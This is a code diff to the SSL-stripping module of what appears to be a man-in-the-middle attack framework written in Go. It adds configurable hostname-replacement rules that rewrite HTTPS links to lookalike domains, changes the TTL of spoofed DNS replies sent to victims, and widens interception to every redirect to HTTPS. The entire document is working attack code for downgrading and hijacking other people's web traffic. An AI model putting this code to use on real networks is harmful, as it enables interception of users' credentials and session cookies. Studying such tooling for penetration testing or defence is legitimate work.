@@ -30,7 +30,7 @@ var (
 
 type SSLStripper struct {
 	enabled       bool
-	useIDN        bool
+	replacements  string
 	session       *session.Session
 	cookies       *CookieTracker
 	hosts         *HostTracker
@@ -38,16 +38,16 @@ type SSLStripper struct {
 	pktSourceChan chan gopacket.Packet
 }
 
-func NewSSLStripper(s *session.Session, enabled bool, useIDN bool) *SSLStripper {
+func NewSSLStripper(s *session.Session, enabled bool, replacements string) *SSLStripper {
 	strip := &SSLStripper{
-		enabled: false,
-		useIDN: false,
+		enabled: enabled,
+		replacements: replacements,
 		cookies: NewCookieTracker(),
 		hosts:   NewHostTracker(),
 		session: s,
 		handle:  nil,
 	}
-	strip.Enable(enabled, useIDN)
+	strip.Enable(enabled, replacements)
 	return strip
 }
 
@@ -70,7 +70,7 @@ func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
 			domain := string(q.Name)
 			original := s.hosts.Unstrip(domain)
 			if original != nil && original.Address != nil {
-				redir, who := dns_spoof.DnsReply(s.session, 1024, pkt, eth, udp, domain, original.Address, dns, eth.SrcMAC)
+				redir, who := dns_spoof.DnsReply(s.session, 5, pkt, eth, udp, domain, original.Address, dns, eth.SrcMAC)
 				if redir != "" && who != "" {
 					log.Debug("[%s] Sending spoofed DNS reply for %s %s to %s.", tui.Green("dns"), tui.Red(domain), tui.Dim(redir), tui.Bold(who))
 				}
@@ -79,9 +79,9 @@ func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
 	}
 }
 
-func (s *SSLStripper) Enable(enabled bool, useIDN bool) {
+func (s *SSLStripper) Enable(enabled bool, replacements string) {
 	s.enabled = enabled
-	s.useIDN = useIDN
+	s.replacements = replacements
 
 	if enabled && s.handle == nil {
 		var err error
@@ -141,9 +141,24 @@ func (s *SSLStripper) processURL(url string) string {
 	if iPort == -1 {
 			iPort = iEndHost
 	}
-	if s.useIDN {
-		// add an international character to the domain name & strip HTTPS port (if any)
-		url = url[:iPort] + "ノ" + url[iEndHost:]
+	// search for domain's part to replace according to the settings
+	replacement := []string{}
+	for _, r := range strings.Fields(s.replacements) {
+		rep := strings.Split(r, ":")
+		if rep[0] == "*" {
+			rep[0] = url[:iPort]
+		}
+		if strings.Contains(url[:iPort], rep[0]) {
+			replacement = rep
+			break
+		}
+	}
+	if len(replacement) != 0{
+		// replace domain according to the settings & strip HTTPS port (if any)
+		url = url[:iPort] + url[iEndHost:]
+		iReplacement := strings.LastIndex(url, replacement[0])
+		replaceto := strings.ReplaceAll(replacement[1], "*", replacement[0])
+		url = url[:iReplacement] + replaceto + url[iReplacement+len(replacement[0]):]
 	} else {
 		// double the last TLD's character & strip HTTPS port (if any)
 		url = url[:iPort] + string(url[iPort-1]) + url[iEndHost:]
@@ -247,8 +262,8 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 			newHost := location.Host
 			newURL := location.String()
 
-			// are we getting redirected from http to https?
-			if orig.Scheme == "http" && location.Scheme == "https" {
+			// are we getting redirected to https?
+			if location.Scheme == "https" {
 
 				log.Info("[%s] Got redirection from HTTP to HTTPS: %s -> %s", tui.Green("sslstrip"), tui.Yellow("http://"+origHost), tui.Bold("https://"+newHost))
 
